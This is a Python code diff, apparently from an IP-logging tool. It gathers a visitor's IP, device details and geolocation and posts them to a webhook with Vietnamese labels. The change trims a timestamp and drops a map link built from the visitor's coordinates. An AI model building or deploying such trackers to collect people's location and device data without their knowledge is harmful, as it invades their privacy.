@@ -118,7 +118,7 @@ def CheckIP(ip, useragent=None, coords=None, url=None, token=None, timestamp=Non
                 created_at=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             )
             logger_res = curd.create_logger_error(db, logger_error=logger_model_error)
-            embed = export_data(ip_info=info, created_at=timestamp, ip=ip, port= port, os= os, browser=browser, useragent=useragent, filename=filename, token='BruteForce server', url_thumnail=url_thumbnail, type='Error: ', id=logger_res.id)
+            embed = export_data(ip_info=info, created_at=str(timestamp)[:-6], ip=ip, port= port, os= os, browser=browser, useragent=useragent, filename=filename, token='BruteForce server', url_thumnail=url_thumbnail, type='Error: ', id=logger_res.id)
             res =requests.post(url, json=embed)
             return logger_res
 
@@ -133,7 +133,7 @@ def generate_random_string(length):
 
     return random_string
 def export_data(ip_info, created_at ,ip, port, os , browser, useragent, filename, token, url_thumnail, type ,id):
-    info=  f"1. IP: {ip}: {port}, Time: {created_at} \n2. Khu vực: {ip_info['city']} - {ip_info['regionName']} - {ip_info['country']}\n3. Thông tin thiết bị: user_agent:{useragent} - device: {os}-{browser}\n4. Nhà cung cấp dịch vụ: {ip_info['isp']}\n5. Loại IP: di động: {ip_info['mobile']}, proxy: {ip_info['proxy']}, hosting: {ip_info['hosting']}\n6. Vị trí tương đối: https://maps.google.com/?q={ip_info['lat']},{ip_info['lon']}\n7. {type}{id}"
+    info=  f"1. IP: {ip}: {port}, Time: {created_at} \n2. Khu vực: {ip_info['city']} - {ip_info['regionName']} - {ip_info['country']}\n3. Thông tin thiết bị: user_agent:{useragent} - device: {os}-{browser}\n4. Nhà cung cấp dịch vụ: {ip_info['isp']}\n5. Di động: {ip_info['mobile']}, Proxy: {ip_info['proxy']}, Hosting: {ip_info['hosting']}\n6. {type}{id}"
     embed = {
         "username": "Thông tin truy cập IP",
         "avatar_url": url_thumnail,
